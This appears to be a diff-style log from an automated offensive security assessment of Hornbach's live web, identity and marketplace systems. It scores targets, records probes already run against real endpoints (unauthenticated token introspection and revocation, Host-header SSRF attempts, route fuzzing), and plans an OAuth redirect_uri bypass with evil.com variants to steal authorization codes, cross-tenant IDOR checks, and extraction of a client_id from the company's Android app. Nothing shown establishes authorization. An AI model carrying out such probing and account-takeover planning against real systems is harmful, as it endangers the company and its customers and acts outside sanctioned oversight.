+- [PRIO] auth.hornbach.com (cidaas OP),8.35,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=8,cloud_surface=8,freshness=5
+- [PRIO] api.hornbach.de,6.75,attack_surface=5,business_value=8,tech_exposure=6,gate_ease=10,cloud_surface=7,freshness=4
+- [PRIO] auth.hornbach.de,6.55,attack_surface=6,business_value=7,tech_exposure=6,gate_ease=10,cloud_surface=5,freshness=4
+- [PRIO] hornbach-mp.mirakl.net,6.45,attack_surface=6,business_value=7,tech_exposure=6,gate_ease=8,cloud_surface=6,freshness=5
+
+## STEP 3 — HYPOTHESES
+[HYP] Unauthenticated token-management plane bypass — introspect JSON+form, revoke, both zero client auth; issuance correctly gated
+class: AUTH
+asset: auth.hornbach.com/token-srv/{introspect,revoke}
+confidence: 78
+reasoning: POST introspect `token=fake` as form OR JSON → 200 `{"active":false}`; POST revoke → 200 `OK`; empty body → 400 `unauthorized_client`; token-srv/token issuance → 400 `invalid_client` (gated). Metadata advertises introspection/revocation auth_methods=[client_secret_basic,post,jwt,private_key_jwt] but router enforces none — body-presence is the sole gate. Stable ≥4 sessions (09-04 14:20/19:53/22:16, 09-05 00:12/08:45/12:0x).
+evidence_needed: real access_token → no-auth introspect returns sub/scope/exp/client_id; no-auth revoke then re-introspect → active=false (silent session kill)
+verify_steps: (DONE) POST form + JSON fake token → 200 both; token/token → 400 invalid_client; empty body → 400. NEXT (client_id+token): POST `token=<real>` to introspect no-auth → claim set; POST revoke; re-introspect → active=false
+impact: token theft → metadata exfil (claims incl sub/scope/exp/client_id) + silent forced-reauth/interception + account-session DoS on identity plane; MEDIUM, gated on possessing a token
+testability: AUTH_HELPED
+
+[HYP] OAuth redirect_uri validation bypass via cidaas authz endpoint
+class: OATH
+asset: auth.hornbach.com/authz-srv/authz
+confidence: 60
+reasoning: Endpoint live; returns HTTP 200 login/consent for a valid client_id (per KB) vs uniform 302→AUTH10007 for invalid; redirect_uri processed pre/post client validation per OAuth; cidaas historically matches redirect_uri with regex/wildcard allowlists. All impact chains (code theft → token → introspect/revoke abuse) pivot here.
+evidence_needed: valid client_id + redirect_uri variation (https://evil.com, https://hornbach.de.evil.com, .hornbach.de@evil.com, //, /..;/...) delivering authz code to attacker origin
+verify_steps: (blocked until client_id) GET /authz-srv/authz?response_type=code&client_id=<id>&scope=openid&redirect_uri=https://evil.com → observe 302-to-evil vs error; iterate bypass shapes only with possession of client_id
+impact: authorization-code theft → session/ATO chain; requires client_id to even begin
+testability: AUTH_HELPED
+
+[HYP] Mirakl authenticated L0 API BOLA/IDOR across partner tenants
+class: IDOR
+asset: hornbach-mp.mirakl.net/api/*
+confidence: 45
+reasoning: /api/{orders,listings,accounts,payments,catalog/products,categories,attributes,feeds,configurations} all live behind uniform 401 (L0 API, standard Mirakl v3.1301); dummy-vs-missing API key → identical 401 (no format differential). cidaas/OAuth gate to a marketplace operator credential is the only blocker.
+evidence_needed: Mirakl API key (operator or seller) → cross-shop BOLA on orders/listings/payments across shop_id; anonymous routes confirmed non-existent
+verify_steps: (DONE) 10 L0 routes → 401; key-format diff → none. NEXT (with any marketplace credential): enumerate shop_ids at /api/orders?shop_id=N, /api/accounts/extrafields, /api/dos — BOLA checks
+impact: cross-tenant seller/order/payment data if a credential leaks; nil anonymously; LOW-MEDIUM
+testability: AUTH_HELPED
+
+## STEP 4 — SELF-CRITIQUE
+- [PARKED] SAP APIM backend SSRF via Host header @ api.hornbach.de: Host-tamper yields uniform 503 edge-vhost reject (127.0.0.1, 169.254.169.254, rfc1918 all identical) — no SSRF primitive; route fuzz exhausted 404; demote to infra intel (`sapigwprd02` via Via header) only.
+- [PARKED] SCIM provisioning controller @ user-scim-srv/v2 (confidence 40): re-probed 401 on /v2/{Schemas,ResourceTypes,Users}; no anonymous route to it; credential-gated like everything else.
+- [PARKED] JWT HS256/RS256 alg confusion (confidence 35): still passive-advertisement only; requires id_token + token; below bar.
+- [FINAL] 1. token-management plane bypass (78) — strongest systemic finding, issuance-gate isolation newly sharpens it
+- [FINAL] 2. authz redirect_uri bypass (60) — highest-impact chain once client_id obtained
+- [FINAL] 3. Mirakl L0 BOLA (45) — credential-gated, standard-surface, keep as low-cost tail
+
+## STEP 5 — NEXT ACTION
+[NEXT] HUMAN: Obtain a valid cidaas client_id — the sole gate across all three FINAL chains. Revised priority: (1) capture `client_id` from the `/authz-srv/authz` redirect during a manual www.hornbach.de login in a fresh browser (bot-challenge passes in a real browser; the OAuth start URL is on the login flow); (2) fallback: the HORNBACH main shopping app is absent from Google Play/APKMirror (likely retired→PWA), so use the HORNBACH Smarthome app (`de.hornbach.app.smarthome`, shares the same cidaas tenant) — install on an Android device/emulator and extract `assets/cidaas.xml` (client_id + redirect_uri scheme) via device filesystem or `adb backup`; APK-mirror scraping is bot-walled (APKPure CF-challenge, APKCombo 404, uptodown blocked) and NOT worth further automation.
+
+## STEP 6 — LEARNING
+- [LEARN] ACCEPTED class AUTH @ auth.hornbach.com/token-srv/introspect: introspect accepts JSON + form bodies → 200 unauthenticated; gate is body-presence (empty → 400 unauthorized_client), not client auth — RFC 7662 violation systemic
+- [LEARN] ACCEPTED class AUTH @ auth.hornbach.com/token-srv/token: issuance requires client auth (400 invalid_client) — bypass is confined to the token-management plane, strengthening defense-ability of the introspect/revoke finding
+- [LEARN] REJECTED class SSRF @ api.hornbach.de/healthcheck: Host-tamper → uniform 503 edge-vhost reject (no backend-contact differentiation); only intel is `Via: sapigwprd02` + `Host: localhost:8080` echo
+- [LEARN] ACCEPTED class AUTH @ auth.hornbach.com: /health-srv and /metrics-srv → 403 on all sub-paths (IP-restricted namespaces, no anonymous surface)
+- [LEARN] REJECTED class MISCONFIG @ www.hornbach.com/de: all paths incl /occ/v2,/storefront → 3038-byte FingerprintJS challenge (full bot-wall); SAP Commerce OCC surface not anonymously reachable
+- [LEARN] REJECTED class OTHER @ hornbach-mp.mirakl.net: L0 /api/* uniform 401 with zero key-format differential; anonymous BOLA surface does not exist
+
+## STEP 7 — RISK
+[RISK] hornbach: 52/100 — token-management-plane no-auth introspect+revoke (200/200) re-confirmed this session with the new isolation fact (issuance 400 invalid_client) making it the single most defensible systemic finding (RFC 7662/7009); request-shape fully resolved (JSON+form, body-presence gate); new infra intel `sapigwprd02` on api.hornbach.de healthcheck; health-srv/metrics-srv 403-gated (no surface); SCC/redirect_uri/Mirakl chains all still client_id-gated; APK extraction path degraded (main app retired/PWA; mirrors bot-walled) pushing client_id to HUMAN browser capture; no anonymous PII reachable; critical path remains client_id acquisition, then real-token introspect/revoke PoC.
